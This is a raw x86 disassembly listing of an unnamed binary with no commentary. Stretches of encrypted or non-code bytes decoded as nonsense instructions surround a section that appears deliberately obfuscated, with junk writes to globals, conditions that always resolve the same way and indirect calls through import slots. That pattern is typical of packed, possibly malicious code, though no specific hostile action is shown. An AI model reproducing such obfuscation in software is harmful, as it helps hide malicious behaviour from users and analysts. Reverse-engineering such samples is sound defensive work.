  4190af:	sub    ch,BYTE PTR [ebx-0x31]
  4190b2:	dec    DWORD PTR [ebp-0x48]
  4190b5:	outs   dx,BYTE PTR ds:[esi]
  4190b6:	clc    
  4190b7:	shl    DWORD PTR [esi-0x73a7a711],1
  4190bd:	hlt    
  4190be:	int3   
  4190bf:	sbb    DWORD PTR [ebp+0x327d7af6],esi
  4190c5:	mov    ebx,0xab1f7f78
  4190ca:	icebp  
  4190cb:	inc    esp
  4190cc:	aaa    
  4190cd:	scas   eax,DWORD PTR es:[edi]
  4190ce:	inc    eax
  4190cf:	es aas 
  4190d1:	and    DWORD PTR [ebx-0x70],ebx
  4190d4:	pop    ebp
  4190d5:	cld    
  4190d6:	daa    
  4190d7:	mov    bh,0x11
  4190d9:	inc    esp
  4190da:	or     ebx,DWORD PTR [eax+0x29537658]
  4190e0:	mov    ch,BYTE PTR [esi+ebp*1-0x5f]
  4190e4:	add    DWORD PTR [edx-0x52],ebx
  4190e7:	(bad)  
  4190e8:	mov    ah,0x58
  4190ea:	xlat   BYTE PTR ds:[ebx]
  4190eb:	ret    0xe710
  4190ee:	dec    edi
  4190ef:	xor    eax,ecx
  4190f1:	pop    ebp
  4190f2:	sti    
  4190f3:	mov    dh,0xb4
  4190f5:	adc    edx,edx
  4190f7:	jmp    0x7f6afcb6
  4190fc:	inc    edi
  4190fd:	sub    eax,0x668612a0
  419102:	mov    ds:0x123bcc2d,eax
  419107:	into   
  419108:	sbb    bh,bh
  41910a:	ss sahf 
  41910c:	cmp    DWORD PTR [eax-0x73802867],ebp
  419112:	mov    WORD PTR [edx+0x7593731b],gs
  419118:	jl     0x4190f1
  41911a:	dec    DWORD PTR ds:0x712daa75
  419120:	pop    es
  419121:	mov    eax,ds:0xbc4dac79
  419126:	mov    ch,0x43
  419128:	inc    esp
  419129:	(bad)  
  41912a:	cld    
  41912b:	xor    al,0x3
  41912d:	or     dh,al
  41912f:	pusha  
  419130:	mov    bl,0xa7
  419132:	push   ebp
  419133:	push   edi
  419134:	sub    eax,0xea6d31d
  419139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41913a:	add    dh,BYTE PTR [eax+edi*1+0x3f6c4991]
  419141:	adc    DWORD PTR [eax+0x5fe43ce4],ebx
  419147:	and    al,0xd5
  419149:	ds push ebp
  41914b:	rcr    DWORD PTR [ebp-0x36a5f3d5],1
  419151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419152:	aaa    
  419153:	test   BYTE PTR [edi],0xc7
  419156:	ins    BYTE PTR es:[edi],dx
  419157:	jp     0x4191ae
  419159:	add    ah,BYTE PTR [edx]
  41915b:	cmp    bh,0xbe
  41915e:	push   ecx
  41915f:	mov    eax,0x71af1b5f
  419164:	push   edi
  419165:	push   edx
  419166:	(bad)  
  419168:	cmp    BYTE PTR [edx-0x33],ah
  41916b:	push   eax
  41916c:	mov    WORD PTR fs:[ecx+0x49a8a601],fs
  419173:	fnstsw WORD PTR ds:0x1ea2e00e
  419179:	xchg   esp,eax
  41917a:	push   cs
  41917b:	jp     0x4191d2
  41917d:	mov    al,0x3b
  41917f:	cmp    DWORD PTR [edi+0xb],0xffffffb7
  419183:	outs   dx,BYTE PTR ds:[esi]
  419184:	mov    cs,WORD PTR [ecx+eiz*1+0x74]
  419188:	jae    0x419131
  41918a:	add    DWORD PTR [edi+0x2afa4c3c],ecx
  419190:	mov    bh,0x19
  419192:	dec    ecx
  419193:	or     ebx,DWORD PTR [eax-0x5c81abc1]
  419199:	sbb    DWORD PTR [ebx],esp
  41919b:	or     dh,BYTE PTR [eax]
  41919d:	add    eax,0xb114e30b
  4191a2:	dec    esi
  4191a3:	xchg   DWORD PTR [ecx-0x4f],ebp
  4191a6:	xchg   edi,eax
  4191a7:	pop    eax
  4191a8:	mov    dh,0x72
  4191aa:	cwde   
  4191ab:	fs xor eax,0xb0b25be1
  4191b1:	xor    BYTE PTR [ebp+0x25],0xa9
  4191b5:	out    dx,eax
  4191b6:	cli    
  4191b7:	call   0xcae2994c
  4191bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191bd:	jecxz  0x4191a9
  4191bf:	out    0xb8,eax
  4191c1:	sub    al,0xff
  4191c3:	out    0x17,al
  4191c5:	outs   dx,BYTE PTR ds:[esi]
  4191c6:	retf   
  4191c7:	mov    ds:0x546e82fb,al
  4191cc:	aad    0xea
  4191ce:	push   0x583fa0b8
  4191d3:	fsub   QWORD PTR [edx]
  4191d5:	repnz adc dl,BYTE PTR [eax+0x24]
  4191d9:	jo     0x4191b0
  4191db:	nop
  4191dc:	cwde   
  4191dd:	push   edi
  4191de:	and    eax,0x188481b3
  4191e3:	arpl   WORD PTR [esi],di
  4191e5:	xor    DWORD PTR [eax+0x6a],eax
  4191e8:	pushf  
  4191e9:	pop    edi
  4191ea:	pop    es
  4191eb:	lahf   
  4191ec:	inc    ebp
  4191ed:	in     al,0xef
  4191ef:	sar    BYTE PTR [ebp+0x10fa20c4],0x4
  4191f6:	xor    al,0x19
  4191f8:	cmp    al,0x7a
  4191fa:	fisttp DWORD PTR [ecx]
  4191fc:	dec    esp
  4191fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191fe:	xchg   esi,eax
  4191ff:	jb     0x41926f
  419201:	xor    ch,dl
  419203:	hlt    
  419204:	jecxz  0x419279
  419206:	xchg   edx,edi
  419208:	xlat   BYTE PTR ds:[ebx]
  419209:	test   BYTE PTR [edi],0x88
  41920c:	xor    al,0xda
  41920e:	scas   eax,DWORD PTR es:[edi]
  41920f:	leave  
  419210:	mov    ds:0xba047480,eax
  419215:	aam    0x8a
  419217:	lods   al,BYTE PTR ds:[esi]
  419218:	retf   
  419219:	jecxz  0x4191f5
  41921b:	xor    DWORD PTR [eax+0x5aec5595],eax
  419221:	xchg   BYTE PTR [esp+ecx*4-0x4b],ch
  419225:	icebp  
  419226:	arpl   WORD PTR [eax-0x67],cx
  419229:	jo     0x41929e
  41922b:	pop    ebx
  41922c:	frstor [ebp+0x48]
  41922f:	push   ebp
  419230:	lods   al,BYTE PTR ds:[esi]
  419231:	sub    DWORD PTR [ebx+0x7230979d],edx
  419237:	pop    ds
  419238:	and    esi,DWORD PTR [edi+0x6121d9f]
  41923e:	push   0x35
  419240:	and    cl,0x4c
  419243:	int    0x74
  419245:	fld    st(0)
  419247:	jecxz  0x419266
  419249:	jb     0x4191cd
  41924b:	adc    dh,BYTE PTR [esi+0x54e14562]
  419251:	(bad)  [ebp+0x600f15d1]
  419257:	cmp    eax,0x3ada40c2
  41925c:	push   ebp
  41925d:	aas    
  41925e:	mov    cl,cl
  419260:	test   eax,ecx
  419262:	enter  0x5a34,0xd6
  419266:	stos   BYTE PTR es:[edi],al
  419267:	das    
  419268:	call   0x518c:0xd7387b1d
  41926f:	pop    ss
  419270:	jge    0x419224
  419272:	push   ds
  419273:	fxch   st(7)
  419275:	fwait
  419276:	imul   esi,esp,0x67
  419279:	mov    ch,0x60
  41927b:	sub    esi,0xffffff95
  41927e:	push   0x4796f6c5
  419283:	xchg   esi,eax
  419284:	sbb    ah,ch
  419286:	push   es
  419287:	sub    edx,ecx
  419289:	add    bh,BYTE PTR [edi]
  41928b:	retf   
  41928c:	push   0x54a3a424
  419291:	inc    edx
  419292:	add    cl,BYTE PTR [esp+edx*1+0x73c58ca3]
  419299:	out    0xe6,eax
  41929b:	stos   DWORD PTR es:[edi],eax
  41929c:	arpl   WORD PTR [ebx+0x35],bp
  41929f:	inc    esi
  4192a0:	ret    0x563f
  4192a3:	or     al,0x17
  4192a5:	shr    eax,1
  4192a7:	into   
  4192a8:	xlat   BYTE PTR ds:[ebx]
  4192a9:	scas   eax,DWORD PTR es:[edi]
  4192aa:	fnstcw WORD PTR [ebx+0x1b2ea1cc]
  4192b0:	jbe    0x4192a0
  4192b2:	sub    BYTE PTR [ecx+eiz*1+0x1f],al
  4192b6:	jge    0x41931e
  4192b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192b9:	cmp    al,0xde
  4192bb:	and    BYTE PTR [edi+0x49],ch
  4192be:	lods   eax,DWORD PTR ds:[esi]
  4192bf:	mov    ds:0x124171de,eax
  4192c4:	jmp    0x4192f7
  4192c6:	loopne 0x41927a
  4192c8:	mov    ds:0x77f5f93f,al
  4192cd:	cld    
  4192ce:	or     BYTE PTR [esi],ah
  4192d0:	cmp    al,0xad
  4192d2:	pop    es
  4192d3:	cmp    eax,0xdcad09ec
  4192d8:	bound  ebp,QWORD PTR [ebx]
  4192da:	mov    eax,ds:0x30c400c1
  4192df:	fnsave [edx-0x2e1a99b2]
  4192e5:	(bad)
  4192e8:	(bad)  
  4192ea:	xchg   esi,eax
  4192eb:	push   ds
  4192ec:	fadd   DWORD PTR [edi-0x49]
  4192ef:	imul   eax,DWORD PTR [ebx+0x5505c1c3],0x2
  4192f6:	and    BYTE PTR [edi-0x67],bh
  4192f9:	sbb    al,0xd4
  4192fb:	nop
  4192fc:	pop    edx
  4192fd:	adc    bl,BYTE PTR [eax-0x6c]
  419300:	inc    ecx
  419301:	add    esi,eax
  419303:	push   cs
  419304:	add    ch,ch
  419306:	jg     0x41934f
  419308:	aam    0x8e
  41930a:	mov    ah,0x92
  41930c:	into   
  41930d:	jno    0x4192a3
  41930f:	push   ebp
  419310:	jb     0x4192e8
  419312:	adc    edi,DWORD PTR [ecx]
  419314:	inc    eax
  419315:	icebp  
  419316:	pop    ebp
  419317:	xchg   esi,eax
  419318:	pop    ecx
  419319:	xchg   BYTE PTR [ebx+0x5f18577],dh
  41931f:	dec    esp
  419320:	and    eax,DWORD PTR [esi-0x34]
  419323:	ins    BYTE PTR es:[edi],dx
  419324:	mov    ch,0xa9
  419326:	jns    0x41939c
  419328:	fcmovnu st,st(4)
  41932a:	push   bx
  41932c:	repz pop esp
  41932e:	ss dec eax
  419330:	call   0x7e1b63fc
  419335:	adc    BYTE PTR [edx+ebp*1-0x79],dh
  419339:	dec    ebp
  41933a:	enter  0xd28a,0xd4
  41933e:	adc    BYTE PTR [eax],dh
  419340:	lahf   
  419341:	cmp    BYTE PTR [ecx+0x76a66eaa],ch
  419347:	mov    al,bl
  419349:	add    eax,ebx
  41934b:	pop    sp
  41934d:	xchg   esp,eax
  41934e:	sub    eax,0x261d0cd5
  419353:	gs aaa 
  419355:	pop    eax
  419356:	mov    dh,ch
  419358:	xlat   BYTE PTR ds:[ebx]
  419359:	pop    eax
  41935a:	jae    0x419311
  41935c:	jp     0x41933c
  41935e:	fnstcw WORD PTR ds:0xaf3188ec
  419364:	ds cmc 
  419366:	pop    ss
  419367:	jecxz  0x4193d9
  419369:	and    BYTE PTR [esi+edi*2-0x9],cl
  41936d:	inc    esi
  41936e:	cs dec esp
  419370:	stc    
  419371:	mov    eax,ds:0x8bd93d48
  419376:	jb     0x4193cf
  419378:	pop    esp
  419379:	xor    ch,BYTE PTR [ebp-0x5c]
  41937c:	ret    0xd67c
  41937f:	lock sub al,0xf1
  419382:	outs   dx,BYTE PTR ds:[esi]
  419383:	mov    ebx,DWORD PTR [ebx]
  419385:	xchg   esi,eax
  419386:	out    0x76,eax
  419388:	cdq    
  419389:	jp     0x419332
  41938b:	aad    0x1a
  41938d:	mov    bh,0xaf
  41938f:	dec    edi
  419390:	push   ebx
  419391:	in     al,dx
  419392:	push   edi
  419393:	push   cs
  419394:	mov    dh,0x70
  419396:	ret    
  419397:	mov    ecx,0x22ba5ec1
  41939c:	xor    BYTE PTR [ecx],0x75
  41939f:	retf   0x14ce
  4193a2:	xor    DWORD PTR [edx+0x6cee4817],esp
  4193a8:	(bad)  
  4193a9:	hlt    
  4193aa:	verw   WORD PTR [ecx-0x7e964429]
  4193b1:	push   ecx
  4193b2:	scas   al,BYTE PTR es:[edi]
  4193b3:	push   eax
  4193b4:	sub    BYTE PTR [edi],bl
  4193b6:	add    al,0x4
  4193b8:	daa    
  4193b9:	xor    al,0x61
  4193bb:	fcomp  st(3)
  4193bd:	sub    dh,BYTE PTR [eax]
  4193bf:	packssdw mm5,QWORD PTR [ecx+0xa86c0bf]
  4193c6:	jmp    0x928e:0xad9cf058
  4193cd:	fdiv   QWORD PTR [eax]
  4193cf:	dec    edi
  4193d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193d1:	lods   al,BYTE PTR ds:[esi]
  4193d2:	cmp    edx,edi
  4193d4:	sbb    al,0xc5
  4193d6:	js     0x4193cc
  4193d8:	jp     0x4193ce
  4193da:	xor    al,0x8e
  4193dc:	fadd   DWORD PTR [edi*2+0x257668c1]
  4193e3:	push   cs
  4193e4:	mov    cl,0xc
  4193e6:	out    dx,eax
  4193e7:	xor    edx,DWORD PTR [eax]
  4193e9:	fwait
  4193ea:	mov    edx,DWORD PTR [ebp+0x79afe56a]
  4193f0:	or     al,0xbd
  4193f2:	inc    esi
  4193f3:	je     0x41939c
  4193f5:	mov    dl,0xc5
  4193f7:	fucomi st,st(3)
  4193f9:	stc    
  4193fa:	xchg   ecx,eax
  4193fb:	jnp    0x419411
  4193fd:	popf   
  4193fe:	and    eax,ebp
  419400:	and    ebp,DWORD PTR [ecx]
  419402:	sub    eax,0xfae22a21
  419407:	push   edi
  419408:	sbb    BYTE PTR [esi+edx*4+0x2400894],al
  41940f:	inc    esp
  419410:	xchg   BYTE PTR [ecx+eax*2],ah
  419413:	ror    DWORD PTR [ebx],0x93
  419416:	inc    ecx
  419417:	jne    0x419405
  419419:	call   FWORD PTR [ecx-0x7f]
  41941c:	inc    esi
  41941d:	sbb    al,0x92
  41941f:	les    edi,FWORD PTR [edi]
  419421:	mov    BYTE PTR ds:0x54739b1c,cl
  419427:	es push 0xe2a88735
  41942d:	jo     0x419464
  41942f:	lods   eax,DWORD PTR ds:[esi]
  419430:	pushf  
  419431:	cmp    al,0xa9
  419433:	or     eax,0xfed0d7a0
  419438:	mov    esp,0x9024f673
  41943d:	test   al,0x2d
  41943f:	fimul  DWORD PTR [esi-0xf]
  419442:	cmp    al,BYTE PTR es:[esi+esi*1]
  419446:	jnp    0x4194a1
  419448:	sahf   
  419449:	add    al,0x2e
  41944b:	pushf  
  41944c:	add    BYTE PTR [edi-0xd],cl
  41944f:	lods   al,BYTE PTR ds:[esi]
  419450:	aad    0x74
  419452:	mov    ecx,DWORD PTR [esp+0x84]
  419459:	shrd   eax,ecx,0x2
  41945d:	cmp    DWORD PTR ds:0x42821f,0x0
  419464:	mov    DWORD PTR ds:0x428377,ebx
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x428383,0x3a28
  419482:	cmp    DWORD PTR ds:0x42821f,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428de0
  41949a:	mov    DWORD PTR ds:0x42825b,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x4282c3
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x4282fb,edx
  4194b2:	mov    DWORD PTR ds:0x428283,0x52b1
  4194bc:	or     DWORD PTR ds:0x42815b,edx
  4194c2:	and    DWORD PTR ds:0x42835f,ecx
  4194c8:	cmp    DWORD PTR ds:0x428307,0x0
  4194cf:	mov    DWORD PTR ds:0x428307,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x428283,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x428383,0x1b74
  4194fc:	mov    DWORD PTR ds:0x42815f,0x3203
  419506:	cmp    DWORD PTR ds:0x428307,0x0
  41950d:	jge    0x41953e
  419513:	push   0x42809b
  419518:	push   0x42807f
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428e74
  419528:	adc    DWORD PTR ds:0x428167,0x266f
  419532:	xor    DWORD PTR ds:0x42835f,ebx
  419538:	xor    DWORD PTR ds:0x4282e7,ecx
  41953e:	mov    DWORD PTR ds:0x428157,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428233
  41954e:	dec    DWORD PTR ds:0x4282e7
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x4282d7,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x42836b,0x428387
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x42816f,0x0
  419589:	mov    DWORD PTR ds:0x42815f,0x514f
  419593:	mov    DWORD PTR ds:0x428163,0x65eb
  41959d:	mov    DWORD PTR ds:0x428213,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x428273,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x42816f,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42802d
  4195cd:	push   0x428049
  4195d2:	call   DWORD PTR ds:0x428e78
  4195d8:	adc    DWORD PTR ds:0x428287,ecx
  4195de:	and    DWORD PTR ds:0x42827b,0x4c04
  4195e8:	add    DWORD PTR ds:0x428153,ebx
  4195ee:	and    DWORD PTR ds:0x42825f,0x6136
  4195f8:	add    DWORD PTR ds:0x428167,ebx
  4195fe:	mov    eax,ds:0x422538
  419603:	and    DWORD PTR ds:0x4282ef,0x428257
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x42814b,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x428173,0x428147
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x428257,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x428287,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x42825f
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x428273,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x428163,0x428133
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x428267,0x42822f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x42814b
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x42814b,0x4282d7
  4196ab:	push   0x4223bc
  4196b0:	sbb    DWORD PTR ds:0x428263,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x42820b,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x42821f
  4196da:	sbb    DWORD PTR ds:0x428303,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428233,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x42824f,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x42821b,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x428353,0x0
  419713:	mov    edx,DWORD PTR ds:0x4282cf
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x42824b,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x428363,0x5836
  419737:	cmp    DWORD PTR ds:0x428353,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428de4
  41974d:	movzx  edx,BYTE PTR ds:0x42814b
  419754:	adc    DWORD PTR ds:0x4282d3,edx
  41975a:	movzx  edx,BYTE PTR ds:0x428287
  419761:	add    DWORD PTR ds:0x42816b,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x42827f,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x42816b,0x0
  419781:	mov    DWORD PTR ds:0x428233,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x42824b,ebx
  419797:	cmp    DWORD PTR ds:0x42816b,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428de8
  4197bf:	sub    DWORD PTR ds:0x428263,0x63b8
  4197c9:	add    DWORD PTR ds:0x4282df,0x42821f
  4197d3:	add    DWORD PTR ds:0x42823f,0x428167
  4197dd:	mov    ebx,DWORD PTR ds:0x428187
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x428297
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x428217,ecx
  4197f8:	and    DWORD PTR ds:0x42826f,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x4282ef
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x42816b,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x428357,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x4282f7,0x6cf
  41984e:	mov    DWORD PTR ds:0x428383,0x6551
  419858:	cmp    DWORD PTR ds:0x42816b,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428e7c
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x42838b
  419891:	mov    ecx,DWORD PTR ds:0x42838f
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x42827b
  4198a2:	cmp    DWORD PTR ds:0x42813f,0x0
  4198a9:	mov    DWORD PTR ds:0x428133,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x4282ff
  4198ba:	not    DWORD PTR ds:0x4282f3
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42813f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428dec
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x428263
  4198e5:	and    DWORD PTR ds:0x4282fb,edi
  4198eb:	mov    edx,DWORD PTR ds:0x4282cf
  4198f1:	sbb    DWORD PTR ds:0x428157,edx
  4198f7:	or     DWORD PTR ds:0x4282e7,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x428253,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x4281ff
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x428203
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x4282f7,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x42820b,0x4551
  419946:	mov    DWORD PTR ds:0x42826f,0x487
  419950:	cmp    DWORD PTR ds:0x4282f7,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428df0
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x4282cf,0x75a
  419988:	sub    DWORD PTR ds:0x428277,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x42821b
  419999:	sub    ecx,DWORD PTR ds:0x42837f
  41999f:	mov    DWORD PTR ds:0x42821b,ecx
  4199a5:	cmp    DWORD PTR ds:0x42823b,0x0
  4199ac:	mov    DWORD PTR ds:0x4282d3,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42813b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x428357,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42823b,edi
  4199da:	cmp    DWORD PTR ds:0x42823b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x428213
  4199ec:	push   0x427f3b
  4199f1:	call   DWORD PTR ds:0x428e80
  4199f7:	sub    DWORD PTR ds:0x428387,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x4282ff
  419a03:	sbb    DWORD PTR ds:0x428287,ecx
  419a09:	adc    edx,DWORD PTR ds:0x42836b
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x4282e7,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x4282df,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x4282f7
  419a31:	xor    DWORD PTR ds:0x42820b,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x42820f
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx-0xa8f7006]
  419a79:	or     DWORD PTR [ebp-0x44],esp
  419a7c:	jecxz  0x419a39
  419a7e:	push   ss
  419a7f:	sbb    BYTE PTR [edx+edx*1-0x5fafe7e8],bh
  419a86:	inc    ecx
  419a87:	fistp  QWORD PTR [ebp+0x21cda1f7]
  419a8d:	xlat   BYTE PTR ds:[ebx]
  419a8e:	mov    DWORD PTR ds:0xbbfa31ae,esp
  419a94:	sahf   
  419a95:	xchg   ecx,eax
  419a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a97:	add    ebp,DWORD PTR [ecx-0x2a]
  419a9a:	test   al,al
  419a9c:	lods   al,BYTE PTR ds:[esi]
  419a9d:	push   es
  419a9e:	lods   al,BYTE PTR ds:[esi]
  419a9f:	dec    edx
  419aa0:	xchg   esp,eax
  419aa1:	xor    eax,0x94e7efd8
  419aa6:	mov    ds:0xe8b1c590,eax
  419aab:	jo     0x419b1a
  419aad:	and    bl,dl
  419aaf:	enter  0xabc2,0x37
  419ab3:	scas   eax,DWORD PTR es:[edi]
  419ab4:	sub    eax,0x26875350
  419ab9:	nop
  419aba:	mov    dl,0x8
  419abc:	out    dx,eax
  419abd:	xchg   ebp,eax
  419abe:	xchg   ecx,eax
  419abf:	int    0x4e
  419ac1:	mov    ebx,0xcde88496
  419ac6:	pusha  
  419ac7:	nop
  419ac8:	mov    al,0xfd
  419aca:	inc    ebp
  419acb:	adc    esp,ebx
  419acd:	loope  0x419a8e
  419acf:	dec    ebx
  419ad0:	stos   BYTE PTR es:[edi],al
  419ad1:	shl    BYTE PTR [esi],cl
  419ad3:	pop    ds
  419ad4:	xchg   ebp,eax
  419ad5:	xchg   DWORD PTR [edi],esi
  419ad7:	in     eax,0xb
  419ad9:	cmp    al,0x2d
  419adb:	mov    dl,0xff
  419add:	jb     0x419aca
  419adf:	cmp    dh,ch
  419ae1:	cmp    DWORD PTR [ebp+0x1a760e2],ecx
  419ae7:	jmp    0x419ad6
  419ae9:	rcl    esp,cl
  419aeb:	lea    ecx,[edi+0x21961205]
  419af1:	(bad)  
  419af2:	xor    eax,0xea2461a0
  419af7:	add    DWORD PTR [eax],esi
  419af9:	ins    DWORD PTR es:[edi],dx
  419afa:	push   ss
  419afb:	test   ch,bh
  419afd:	pushf  
  419afe:	sbb    BYTE PTR [ecx],al
  419b00:	cmp    al,0x67
  419b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b03:	xchg   edi,eax
  419b04:	bound  esp,QWORD PTR [edi+0x145fc1ae]
  419b0a:	add    DWORD PTR [ebp-0x4a],ecx
  419b0d:	jo     0x419b49
  419b0f:	in     al,dx
  419b10:	add    DWORD PTR [ebx+0x7292ed31],0x1466f4d3
  419b1a:	call   0x182910ae
  419b1f:	out    0xab,eax
